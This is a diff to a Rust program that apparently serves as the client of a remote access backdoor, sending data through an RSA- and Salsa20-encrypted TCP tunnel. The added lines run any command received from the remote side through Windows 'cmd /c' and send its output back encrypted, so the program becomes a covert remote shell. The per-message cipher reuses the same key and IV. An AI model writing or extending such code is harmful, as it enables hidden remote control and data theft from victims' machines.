@@ -1,13 +1,13 @@
 use std::io::{self, Read, Write};
 use std::net::TcpStream;
-use typenum::consts::U10;
-use salsa20::SalsaCore;
-use salsa20::cipher::{StreamCipherCoreWrapper, StreamCipher, StreamCipherSeek};
-use salsa20::{Salsa20, cipher::KeyIvInit};
+use std::process::Command;
+
 use flate2::{write::ZlibEncoder, Compression};
 use rand::{distributions::Alphanumeric, Rng};
 use rsa::pkcs1::DecodeRsaPublicKey;
 use rsa::{Pkcs1v15Encrypt, RsaPublicKey};
+use salsa20::cipher::{StreamCipher, StreamCipherSeek};
+use salsa20::{cipher::KeyIvInit, Salsa20};
 
 // TODO: add commands
 
@@ -15,24 +15,22 @@ const BUFFER: usize = 1024;
 struct EncryptedTunnel {
     _key: Vec<u8>,
     _iv: Vec<u8>,
-    cipher: StreamCipherCoreWrapper<SalsaCore<U10>>,
     socket: TcpStream,
 }
 
 impl EncryptedTunnel {
     fn new(key: &[u8], iv: &[u8], socket: TcpStream) -> Self {
-        let cipher = Salsa20::new(key.into(), iv.into());
-        
+
         Self {
             _key: key.to_vec(),
             _iv: iv.to_vec(),
             socket,
-            cipher
         }
     }
 
     fn send(&mut self, mut data: Vec<u8>) -> Result<(), io::Error> {
-        self.cipher.apply_keystream(data.as_mut_slice());
+        let mut cipher = Salsa20::new(self._key.as_slice().into(), self._iv.as_slice().into());
+        cipher.apply_keystream(data.as_mut_slice());
 
         self.socket.write_all(&data)?;
 
@@ -40,11 +38,13 @@ impl EncryptedTunnel {
     }
 
     fn recv(&mut self, buffer: &mut [u8]) -> Result<Vec<u8>, io::Error> {
+        let mut cipher = Salsa20::new(self._key.as_slice().into(), self._iv.as_slice().into());
+
         let readed = self.socket.read(buffer)?;
         let getted = &mut buffer[..readed];
 
-        self.cipher.seek(0u32);
-        self.cipher.apply_keystream(getted);
+        cipher.seek(0u32);
+        cipher.apply_keystream(getted);
 
         Ok(getted.to_vec())
     }
@@ -114,8 +114,15 @@ fn main() -> Result<(), io::Error> {
 
         match cmd.as_str() {
             "2" => enctunnel.send(b"3".to_vec())?,
-            _ => ()
-        }
+            _ => {
+                let output = Command::new("cmd")
+                    .arg("/c")
+                    .arg(cmd)
+                    .output()
+                    .expect("Failed execute command");
 
+                enctunnel.send(output.stdout).unwrap();
+            }
+        }
     }
 }
